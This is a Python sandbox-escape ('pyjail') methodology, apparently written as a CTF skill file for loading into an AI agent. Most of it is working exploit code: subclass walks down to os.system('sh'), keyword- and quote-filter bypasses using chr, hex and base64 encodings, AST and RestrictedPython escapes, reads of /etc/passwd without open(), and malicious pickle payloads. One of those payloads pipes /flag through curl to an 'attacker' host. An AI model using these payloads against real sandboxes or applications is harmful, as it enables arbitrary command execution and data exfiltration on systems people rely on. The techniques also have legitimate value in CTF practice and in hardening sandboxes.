# Python Sandbox Escape (Pyjail) — Complete Methodology

> **AI LOAD INSTRUCTION**: Load this for complete pyjail escape techniques. Covers `__builtins__` recovery via subclass walking, keyword bypass via `getattr`/`chr()`, AST-based sandbox bypass, RestrictedPython escape, exec with custom globals, file read without `open()`, pickle deserialization, and code object manipulation. Assumes [SKILL.md](./SKILL.md) is loaded for sandbox type identification.

---

## 1. __builtins__ RECOVERY VIA SUBCLASS WALKING

The fundamental technique: walk Python's class hierarchy to find useful classes.

### The Chain

```python
# Start from any object literal
().__class__                          # <class 'tuple'>
().__class__.__bases__                # (<class 'object'>,)
().__class__.__bases__[0]             # <class 'object'>
().__class__.__bases__[0].__subclasses__()  # ALL loaded classes

# Find useful subclass (index varies by Python version):
# Look for: os._wrap_close, warnings.catch_warnings, subprocess.Popen
# Example: find os._wrap_close
for i, cls in enumerate(''.__class__.__bases__[0].__subclasses__()):
    if 'wrap_close' in str(cls):
        print(i, cls)
        break

# Access os.system via __init__.__globals__
().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['system']('sh')
```

### Common Useful Subclasses

| Class | Access | Use |
|---|---|---|
| `os._wrap_close` | `.__init__.__globals__['system']` | Command execution |
| `warnings.catch_warnings` | `.__init__.__globals__['__builtins__']['__import__']` | Recover `__import__` |
| `subprocess.Popen` | Direct: `Popen(['sh'], ...)` | Command execution |
| `importlib._bootstrap._ModuleLock` | `.__init__.__globals__` | Access import machinery |
| `codecs.IncrementalDecoder` | `.__init__.__globals__` | Another globals access point |

### Alternative Starting Points

```python
''.__class__.__mro__[1].__subclasses__()   # from string
[].__class__.__mro__[1].__subclasses__()   # from list
{}.__class__.__mro__[1].__subclasses__()   # from dict
(0).__class__.__mro__[1].__subclasses__()  # from int
True.__class__.__mro__[1].__subclasses__() # from bool
```

---

## 2. KEYWORD BYPASS TECHNIQUES

### When import/os/system are Filtered

```python
# String concatenation
__builtins__.__dict__['__imp'+'ort__']('o'+'s').system('sh')

# getattr
getattr(__builtins__, '__import__')('os').system('sh')
getattr(getattr(__builtins__, '__impo' + 'rt__')('o' + 's'), 'system')('sh')

# chr() construction
eval(chr(95)*2 + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95)*2)
# Builds "__import__"

# Hex escape in string
eval("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f('os').system('sh')")

# Unicode escape
eval("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f('os')")

# Base64
import base64
eval(base64.b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NoJyk='))
```

### When Quotes are Filtered

```python
# Use chr() to build strings without quotes
s = chr(115) + chr(104)  # "sh"
__import__(chr(111)+chr(115)).system(s)

# Use bytes/bytearray
eval(bytes([111, 115]).decode())  # "os"

# Use input() in Python 2 (reads from stdin)
# Use dict keys: list({1:2})[0].__class__.__name__  etc.
```

### When Dots are Filtered

```python
# Use getattr
getattr(getattr(__builtins__, '__import__')('os'), 'system')('sh')

# Use __getattribute__
''.__class__.__getattribute__(''.__class__, '__bases__')
```

### When Parentheses are Filtered

```python
# Python 2: print is a statement
# Python 3: decorators, class definitions, or __init_subclass__
@exec
@input
class X:
    pass
# Prompts for input, evaluates as Python code

# Using __init_subclass__
class Exploit:
    def __init_subclass__(cls, **kwargs):
        __import__('os').system('sh')

class Trigger(Exploit):
    pass
```

---

## 3. AST-BASED SANDBOX BYPASS

Some sandboxes parse the AST and block dangerous nodes.

### Common AST Restrictions and Bypasses

| Blocked AST Node | Bypass |
|---|---|
| `ast.Import` / `ast.ImportFrom` | Use `__import__()` call instead |
| `ast.Call` | Use decorators, `__init_subclass__`, or class instantiation side effects |
| `ast.Attribute` (dot access) | Use `getattr()` or `__getattribute__` |
| `ast.Subscript` (`[]`) | Use `__getitem__` method |
| All expressions | Use format strings: `f"{__import__('os').system('sh')}"` |

### Bypassing Call Restriction

```python
# If ast.Call is blocked but ast.FunctionDef is allowed:
class X:
    __class_getitem__ = staticmethod(exec)
X['__import__("os").system("sh")']  # Subscript triggers exec

# Or via __init_subclass__
class Base:
    def __init_subclass__(cls, cmd='', **kwargs):
        __import__('os').system(cmd)
class Evil(Base, cmd='sh'):
    pass
```

---

## 4. RESTRICTEDPYTHON BYPASS

RestrictedPython is used in Plone/Zope and some CTFs.

### Key Restrictions and Escapes

| Restriction | Bypass |
|---|---|
| No `_` prefix attributes | Use `getattr` with computed string |
| No `__import__` | Walk `__subclasses__` to find import mechanism |
| `_getattr_` wrapper | Find code path that doesn't go through `_getattr_` |
| `_getiter_` wrapper | Use `map`/`filter` instead of direct iteration |

```python
# RestrictedPython typically instruments attribute access with _getattr_
# Bypass by accessing __globals__ through method __func__
[x for x in ().__class__.__bases__[0].__subclasses__()
 if 'BuiltinImporter' in str(x)][0].load_module('os').system('sh')
```

---

## 5. FILE READ WITHOUT open()

```python
# help() function leaks file contents
help.__class__.__init__.__globals__  # access globals

# license() / credits() in interactive mode
# They use open() internally

# pathlib
from pathlib import Path
Path('/etc/passwd').read_text()

# os module
import os
os.read(os.open('/etc/passwd', os.O_RDONLY), 1000)

# codecs
import codecs
codecs.open('/etc/passwd').read()

# URL handlers
import urllib.request
urllib.request.urlopen('file:///etc/passwd').read()

# linecache
import linecache
linecache.getlines('/etc/passwd')
```

---

## 6. PICKLE DESERIALIZATION ESCAPE

If the sandbox uses `pickle.loads()` on untrusted data:

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('sh',))

# Serialize
payload = pickle.dumps(Exploit())

# Raw pickle opcodes (no Python class needed):
# cos\nsystem\n(S'sh'\ntR.
payload = b"cos\nsystem\n(S'sh'\ntR."
pickle.loads(payload)  # executes os.system('sh')
```

### Advanced Pickle Gadgets

```python
# Multi-stage: read file + send over network
payload = b"""(S'curl http://attacker/?flag='
ios
system
(S'cat /flag | curl -d @- http://attacker/'
tR."""

# Using __import__ in pickle:
# c__builtin__\n__import__\n(S'os'\ntRp0\n(S'system'\ng0\ntR
```

---

## 7. CODE OBJECT MANIPULATION

Construct a Python code object to bypass restrictions on `exec`/`eval`.

```python
import types

# Build code object that calls os.system
code = types.CodeType(
    0,                   # argcount
    0,                   # posonlyargcount (Python 3.8+)
    0,                   # kwonlyargcount
    2,                   # nlocals
    4,                   # stacksize
    0,                   # flags
    b'\x97\x00...',      # bytecode (platform-specific)
    (None,),             # constants
    ('__import__', 'os', 'system', 'sh'),  # names
    (),                  # varnames
    'exploit',           # filename
    'exploit',           # name
    1,                   # firstlineno
    b'',                 # lnotab
)
exec(code)
```

### Simpler: Compile + Modify

```python
# Compile allowed code, modify bytecode to do something else
c = compile("pass", "<x>", "exec")
# Replace co_code, co_consts, co_names in the code object
# Then exec(modified_code)
```

---

## 8. PYTHON 2 vs PYTHON 3 DIFFERENCES

| Aspect | Python 2 | Python 3 |
|---|---|---|
| `input()` | Evaluates expression (dangerous) | Reads string (safe) |
| `exec` | Statement: `exec "code"` | Function: `exec("code")` |
| String types | `str` (bytes) + `unicode` | `str` (unicode) + `bytes` |
| `file()` builtin | Exists: `file('/etc/passwd').read()` | Removed |
| Division | Integer division by default | Float division |
| `__builtins__` | Module or dict (context-dependent) | Module or dict |

---

## 9. CTF PYJAIL QUICK CHECKLIST

```
1. What Python version? (2 vs 3, exact minor)
2. What's available in __builtins__?
3. Is eval/exec available?
4. Is __import__ available?
5. Are underscores (_) allowed?
6. Are dots (.) allowed?
7. Are parentheses allowed?
8. Are quotes (' ") allowed?
9. Character length limit?
10. Newline allowed? (multi-statement)
11. Is output returned to you?
12. What modules are pre-imported?
13. Is the jail forking or threading?
14. Any AST-level restrictions?
15. Is pickle/marshal/shelve used anywhere?
```

---

## 10. DECISION TREE

```
Python sandbox escape
├── __builtins__ intact?
│   ├── YES → __import__('os').system('sh')
│   └── NO → need to recover builtins
├── Can access __class__/__bases__/__subclasses__?
│   ├── YES → subclass walk to find os/subprocess
│   └── NO (underscores blocked)
│       ├── getattr available? → getattr((), chr(95)*2 + 'class' + chr(95)*2)
│       └── Everything blocked? → try decorators, f-strings, code objects
├── Keywords filtered?
│   ├── String concat: 'im'+'port'
│   ├── chr(): chr(105)+chr(109)+...
│   ├── Hex: "\x69\x6d\x70\x6f\x72\x74"
│   └── getattr + computed string
├── eval/exec available?
│   ├── YES → construct payload string + eval/exec
│   └── NO → class tricks (__init_subclass__, __class_getitem__)
├── Pickle/marshal in scope?
│   └── YES → craft malicious pickle → os.system via __reduce__
└── Need file read only (no exec)?
    ├── pathlib.Path.read_text()
    ├── os.read(os.open(...))
    └── linecache.getlines()
```
